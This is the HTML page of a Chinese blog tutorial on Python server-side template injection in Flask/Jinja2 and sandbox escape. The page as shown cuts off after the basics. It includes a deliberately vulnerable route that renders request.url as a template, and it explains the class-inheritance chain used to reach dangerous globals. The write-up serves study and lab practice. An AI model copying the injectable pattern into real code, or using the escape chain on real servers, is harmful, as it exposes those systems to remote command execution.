<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#6200ee"><meta name="author" content="m0re"><meta name="copyright" content="m0re"><meta name="generator" content="Hexo 5.1.0"><meta name="theme" content="hexo-theme-yun"><title>Python的SSTI模版注入及沙盒逃逸 | m0re的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_j5gk85dg4pf.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" href="/m0re.ico"><link rel="mask-icon" href="/m0re.ico" color="#6200ee"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"m0re.top","root":"/","title":"人生路漫漫","version":"1.6.1","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="选一种姿态，让自己活成无可替代 前言最近看python的SSTI模板注入，此文部分内容为转载，师傅写的很好，就摘录了一部分下来，原文链接：https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;188172除此之外，还在先知上看到了一篇关于一个sstilabs靶场的一篇文章，地址在这里：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10394 原理老生常谈的问题:什么是SSTI，模版注">
<meta property="og:type" content="article">
<meta property="og:title" content="Python的SSTI模版注入及沙盒逃逸">
<meta property="og:url" content="https://m0re.top/posts/39874e07/index.html">
<meta property="og:site_name" content="m0re的小站">
<meta property="og:description" content="选一种姿态，让自己活成无可替代 前言最近看python的SSTI模板注入，此文部分内容为转载，师傅写的很好，就摘录了一部分下来，原文链接：https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;188172除此之外，还在先知上看到了一篇关于一个sstilabs靶场的一篇文章，地址在这里：https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10394 原理老生常谈的问题:什么是SSTI，模版注">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220107010042.jpeg">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20201206161515.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20201206201259.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20201206201332.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220107011452.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220108005319.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220108005424.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220110145820.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220110150512.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220110153731.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220110161207.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220110161515.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220110161829.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/20220110164037.png">
<meta property="article:published_time" content="2022-01-10T12:05:32.907Z">
<meta property="article:modified_time" content="2022-01-10T12:04:45.188Z">
<meta property="article:author" content="m0re">
<meta property="article:tag" content="Python">
<meta property="article:tag" content="SSTI">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/m0re/picture/raw/master/img/20220107010042.jpeg"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="m0re"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="m0re"><span class="site-author-status" title="穷鬼啊啊啊啊">😭</span></a><div class="site-author-name"><a href="/about/">m0re</a></div><span class="site-name">m0re的小站</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">123</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">21</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">54</span></a></div><a class="site-state-item hty-icon-button" href="/Tools/" title="Tools"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/zxcv0221" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/ISm0r3" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:m0re.lxj@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#os-system"><span class="toc-number">2.2.</span> <span class="toc-text">os.system</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#os-popen"><span class="toc-number">2.3.</span> <span class="toc-text">os.popen()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subprocess"><span class="toc-number">2.4.</span> <span class="toc-text">subprocess</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0%E7%9A%84"><span class="toc-number">3.</span> <span class="toc-text">payload如何构造的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTIlabs"><span class="toc-number">4.</span> <span class="toc-text">SSTIlabs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-1"><span class="toc-number">4.1.</span> <span class="toc-text">Level-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-2"><span class="toc-number">4.2.</span> <span class="toc-text">Level-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-9"><span class="toc-number">4.3.</span> <span class="toc-text">Level-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level-10"><span class="toc-number">4.4.</span> <span class="toc-text">level-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Level-11"><span class="toc-number">4.5.</span> <span class="toc-text">Level-11</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">结</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://m0re.top/posts/39874e07/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="m0re"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="m0re的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Python的SSTI模版注入及沙盒逃逸</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2022-01-10 20:05:32" itemprop="dateCreated datePublished" datetime="2022-01-10T20:05:32+08:00">2022-01-10</time></div><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><span class="leancloud_visitors" id="/posts/39874e07/" data-flag-title="Python的SSTI模版注入及沙盒逃逸"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Web</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Python/" style="--text-color:#3776ab"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">Python</span></a><a class="tag-item" href="/tags/SSTI/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">SSTI</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#6200ee;"><p><img src="https://gitee.com/m0re/picture/raw/master/img/20220107010042.jpeg" loading="lazy"><br>选一种姿态，让自己活成无可替代</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看python的SSTI模板注入，此文部分内容为转载，师傅写的很好，就摘录了一部分下来，原文链接：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188172">https://www.anquanke.com/post/id/188172</a><br>除此之外，还在先知上看到了一篇关于一个sstilabs靶场的一篇文章，地址在这里：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10394">https://xz.aliyun.com/t/10394</a></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>老生常谈的问题:什么是SSTI，模版注入，注入的知识，就是没有控制好用户输入的数据，从而使得用户插入的数据变成可执行程序的一部分，改变程序的执行逻辑。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
    <span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
    <span class="token keyword">from</span> flask <span class="token keyword">import</span> request
    <span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template_string
    app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
    <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/test'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        template <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
            &lt;div class="center-content error">
                &lt;h1>Oops! That page doesn't exist.&lt;/h1>
                &lt;h3>%s&lt;/h3>
            &lt;/div> 
        '''</span> <span class="token operator">%</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
<span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span>
    <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
        app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span>
        app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>最典型的ssti漏洞，原因是<code>render_template_string</code>函数在渲染模版的时候使用<code>%s</code>来替换字符串，Flask中使用了Jinja2作为模板渲染引擎，<code>&#123;&#123;&#125;&#125;`在Jinja2作为变量包裹标识符，在渲染时会把`&#123;&#123;&#125;&#125;</code>包裹的内容当作变量解析替换，比如2会被解析成2<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201206161515.png" alt="m0re" loading="lazy"><br>产生SSTI的原因是由于模板渲染时，问题代码为了使得用户输入更加方便，让功能更加灵活，所以才导致了直接将用户输入得url拼接到template中，然后在进行渲染，所以在用户传入的内容中包括了<code>&#123;&#123;xxx&#125;&#125;</code>，那么在使用时就会被渲染，进而<code>&#123;&#123;&#125;&#125;`内的内容会被解析。
## Python基础
### 内建函数
在启动交互式python解释器的时候，还没有创建任何函数和变量，但是确直接可以使用`print()`等函数，这些函数就被称为内建函数。
内建函数是在启动时自行导入内存，以供使用。
> 内建名称空间：python自带的名字，在python解释器启动时产生，存放一些python内置的名字
全局名称空间：在执行文件时，存放文件级别定义的名字
局部名称空间（可能不存在）：在执行文件的过程中，如果调用了函数，则会产生该函数的名称空间，用来存放该函数内定义的名字，该名字在函数调用时生效，调用结束后失效

加载顺序：内置名称空间----->全局名称空间------>局部名称空间。
名字查找顺序: 局部名称空间----->全局名称空间------>内置名称空间

我们主要关注的是内建名称空间，是名字到内建对象的映射，在python中，初始的builtins模块提供内建名称空间到内建对象的映射
dir()函数可以展示一个对象的属性有什么，在不提供对象的时候，将会提供当前环境所导入的所有模块，我们可以看到初始模块有哪些
<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token string">'__annotations__'</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__loader__'</span><span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">,</span> <span class="token string">'__spec__'</span><span class="token punctuation">]</span></code></pre>
还可以看一下`__builtins__`,它是作为默认模块出现的，那么它的下面函数应该很多的
<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">dir</span><span class="token punctuation">(</span>__builtins__<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token string">'ArithmeticError'</span><span class="token punctuation">,</span> <span class="token string">'AssertionError'</span><span class="token punctuation">,</span> <span class="token string">'AttributeError'</span><span class="token punctuation">,</span> <span class="token string">'BaseException'</span><span class="token punctuation">,</span> <span class="token string">'BlockingIOError'</span><span class="token punctuation">,</span> <span class="token string">'BrokenPipeError'</span><span class="token punctuation">,</span> <span class="token string">'BufferError'</span><span class="token punctuation">,</span> <span class="token string">'BytesWarning'</span><span class="token punctuation">,</span> <span class="token string">'ChildProcessError'</span><span class="token punctuation">,</span> <span class="token string">'ConnectionAbortedError'</span><span class="token punctuation">,</span> <span class="token string">'ConnectionError'</span><span class="token punctuation">,</span> <span class="token string">'ConnectionRefusedError'</span><span class="token punctuation">,</span> <span class="token string">'ConnectionResetError'</span><span class="token punctuation">,</span> <span class="token string">'DeprecationWarning'</span><span class="token punctuation">,</span> <span class="token string">'EOFError'</span><span class="token punctuation">,</span> <span class="token string">'Ellipsis'</span><span class="token punctuation">,</span> <span class="token string">'EnvironmentError'</span><span class="token punctuation">,</span> <span class="token string">'Exception'</span><span class="token punctuation">,</span> <span class="token string">'False'</span><span class="token punctuation">,</span> <span class="token string">'FileExistsError'</span><span class="token punctuation">,</span> <span class="token string">'FileNotFoundError'</span><span class="token punctuation">,</span> <span class="token string">'FloatingPointError'</span><span class="token punctuation">,</span> <span class="token string">'FutureWarning'</span><span class="token punctuation">,</span> <span class="token string">'GeneratorExit'</span><span class="token punctuation">,</span> <span class="token string">'IOError'</span><span class="token punctuation">,</span> <span class="token string">'ImportError'</span><span class="token punctuation">,</span> <span class="token string">'ImportWarning'</span><span class="token punctuation">,</span> <span class="token string">'IndentationError'</span><span class="token punctuation">,</span> <span class="token string">'IndexError'</span><span class="token punctuation">,</span> <span class="token string">'InterruptedError'</span><span class="token punctuation">,</span> <span class="token string">'IsADirectoryError'</span><span class="token punctuation">,</span> <span class="token string">'KeyError'</span><span class="token punctuation">,</span> <span class="token string">'KeyboardInterrupt'</span><span class="token punctuation">,</span> <span class="token string">'LookupError'</span><span class="token punctuation">,</span> <span class="token string">'MemoryError'</span><span class="token punctuation">,</span> <span class="token string">'ModuleNotFoundError'</span><span class="token punctuation">,</span> <span class="token string">'NameError'</span><span class="token punctuation">,</span> <span class="token string">'None'</span><span class="token punctuation">,</span> <span class="token string">'NotADirectoryError'</span><span class="token punctuation">,</span> <span class="token string">'NotImplemented'</span><span class="token punctuation">,</span> <span class="token string">'NotImplementedError'</span><span class="token punctuation">,</span> <span class="token string">'OSError'</span><span class="token punctuation">,</span> <span class="token string">'OverflowError'</span><span class="token punctuation">,</span> <span class="token string">'PendingDeprecationWarning'</span><span class="token punctuation">,</span> <span class="token string">'PermissionError'</span><span class="token punctuation">,</span> <span class="token string">'ProcessLookupError'</span><span class="token punctuation">,</span> <span class="token string">'RecursionError'</span><span class="token punctuation">,</span> <span class="token string">'ReferenceError'</span><span class="token punctuation">,</span> <span class="token string">'ResourceWarning'</span><span class="token punctuation">,</span> <span class="token string">'RuntimeError'</span><span class="token punctuation">,</span> <span class="token string">'RuntimeWarning'</span><span class="token punctuation">,</span> <span class="token string">'StopAsyncIteration'</span><span class="token punctuation">,</span> <span class="token string">'StopIteration'</span><span class="token punctuation">,</span> <span class="token string">'SyntaxError'</span><span class="token punctuation">,</span> <span class="token string">'SyntaxWarning'</span><span class="token punctuation">,</span> <span class="token string">'SystemError'</span><span class="token punctuation">,</span> <span class="token string">'SystemExit'</span><span class="token punctuation">,</span> <span class="token string">'TabError'</span><span class="token punctuation">,</span> <span class="token string">'TimeoutError'</span><span class="token punctuation">,</span> <span class="token string">'True'</span><span class="token punctuation">,</span> <span class="token string">'TypeError'</span><span class="token punctuation">,</span> <span class="token string">'UnboundLocalError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeDecodeError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeEncodeError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeTranslateError'</span><span class="token punctuation">,</span> <span class="token string">'UnicodeWarning'</span><span class="token punctuation">,</span> <span class="token string">'UserWarning'</span><span class="token punctuation">,</span> <span class="token string">'ValueError'</span><span class="token punctuation">,</span> <span class="token string">'Warning'</span><span class="token punctuation">,</span> <span class="token string">'ZeroDivisionError'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">'__build_class__'</span><span class="token punctuation">,</span> <span class="token string">'__debug__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__import__'</span><span class="token punctuation">,</span> <span class="token string">'__loader__'</span><span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">,</span> <span class="token string">'__spec__'</span><span class="token punctuation">,</span> <span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'all'</span><span class="token punctuation">,</span> <span class="token string">'any'</span><span class="token punctuation">,</span> <span class="token string">'ascii'</span><span class="token punctuation">,</span> <span class="token string">'bin'</span><span class="token punctuation">,</span> <span class="token string">'bool'</span><span class="token punctuation">,</span> <span class="token string">'breakpoint'</span><span class="token punctuation">,</span> <span class="token string">'bytearray'</span><span class="token punctuation">,</span> <span class="token string">'bytes'</span><span class="token punctuation">,</span> <span class="token string">'callable'</span><span class="token punctuation">,</span> <span class="token string">'chr'</span><span class="token punctuation">,</span> <span class="token string">'classmethod'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'complex'</span><span class="token punctuation">,</span> <span class="token string">'copyright'</span><span class="token punctuation">,</span> <span class="token string">'credits'</span><span class="token punctuation">,</span> <span class="token string">'delattr'</span><span class="token punctuation">,</span> <span class="token string">'dict'</span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'divmod'</span><span class="token punctuation">,</span> <span class="token string">'enumerate'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">,</span> <span class="token string">'filter'</span><span class="token punctuation">,</span> <span class="token string">'float'</span><span class="token punctuation">,</span> <span class="token string">'format'</span><span class="token punctuation">,</span> <span class="token string">'frozenset'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">,</span> <span class="token string">'globals'</span><span class="token punctuation">,</span> <span class="token string">'hasattr'</span><span class="token punctuation">,</span> <span class="token string">'hash'</span><span class="token punctuation">,</span> <span class="token string">'help'</span><span class="token punctuation">,</span> <span class="token string">'hex'</span><span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token string">'int'</span><span class="token punctuation">,</span> <span class="token string">'isinstance'</span><span class="token punctuation">,</span> <span class="token string">'issubclass'</span><span class="token punctuation">,</span> <span class="token string">'iter'</span><span class="token punctuation">,</span> <span class="token string">'len'</span><span class="token punctuation">,</span> <span class="token string">'license'</span><span class="token punctuation">,</span> <span class="token string">'list'</span><span class="token punctuation">,</span> <span class="token string">'locals'</span><span class="token punctuation">,</span> <span class="token string">'map'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'memoryview'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'next'</span><span class="token punctuation">,</span> <span class="token string">'object'</span><span class="token punctuation">,</span> <span class="token string">'oct'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'ord'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'print'</span><span class="token punctuation">,</span> <span class="token string">'property'</span><span class="token punctuation">,</span> <span class="token string">'quit'</span><span class="token punctuation">,</span> <span class="token string">'range'</span><span class="token punctuation">,</span> <span class="token string">'repr'</span><span class="token punctuation">,</span> <span class="token string">'reversed'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'set'</span><span class="token punctuation">,</span> <span class="token string">'setattr'</span><span class="token punctuation">,</span> <span class="token string">'slice'</span><span class="token punctuation">,</span> <span class="token string">'sorted'</span><span class="token punctuation">,</span> <span class="token string">'staticmethod'</span><span class="token punctuation">,</span> <span class="token string">'str'</span><span class="token punctuation">,</span> <span class="token string">'sum'</span><span class="token punctuation">,</span> <span class="token string">'super'</span><span class="token punctuation">,</span> <span class="token string">'tuple'</span><span class="token punctuation">,</span> <span class="token string">'type'</span><span class="token punctuation">,</span> <span class="token string">'vars'</span><span class="token punctuation">,</span> <span class="token string">'zip'</span><span class="token punctuation">]</span></code></pre>
看多好多熟悉的函数，input、str、len、pow等函数
这样就解释得通为什么打开python解释器不用先import导入模块就可以直接使用一些函数了。
### 类的继承
python中对一个变量应用class方法从一个变量实例转到对应的对象类型后，类有以下三种关于继承关系的方法
<pre class="language-python" data-language="python"><code class="language-python">__base__ <span class="token operator">//</span>对象的一个基类，一般情况下是<span class="token builtin">object</span>，有时不是，这时需要使用下一个方法

__mro__ <span class="token operator">//</span>同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，<span class="token builtin">object</span>在最底层故在列表中的最后，通过__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>可以获取到

__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">//</span>继承此对象的子类，返回一个列表</code></pre>
有这些类继承的方法，我们就可以从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类，就可以获得到很多的类。
### 一些魔术函数
`__dict__`类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的`__dict__`里的对象的`__dict__`中存储了一些self.xxx的一些东西内置的数据类型没有`__dict__`属性每个类有自己的`__dict__`属性，就算存在继承关系，父类的`__dict__` 并不会影响子类的`__dict__`对象也有自己的`__dict__`属性， 存储`self.xxx` 信息，父子类对象公用`__dict__`
`__globals__`该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用`globals`属性访问全局的变量。该属性保存的是函数全局变量的字典引用。
`__getattribute__()`实例、类、函数都具有的`__getattribute__`魔术方法。事实上，在实例化的对象进行.操作的时候（形如：`a.xxx/a.xxx()`），都会自动去调用`__getattribute__`方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
就像PHP序列化时，自动调用某些函数。
### 利用方法
根据上面提到的类继承的知识，我们可以总结出一个利用方式（这也是python沙盒溢出的关键）：从变量->对象->基类->子类遍历->全局变量。

如何才能在python环境下，不直接使用open而来打开一个文件？
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#python2</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__
<span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span>
<span class="token comment">#回到基类</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__
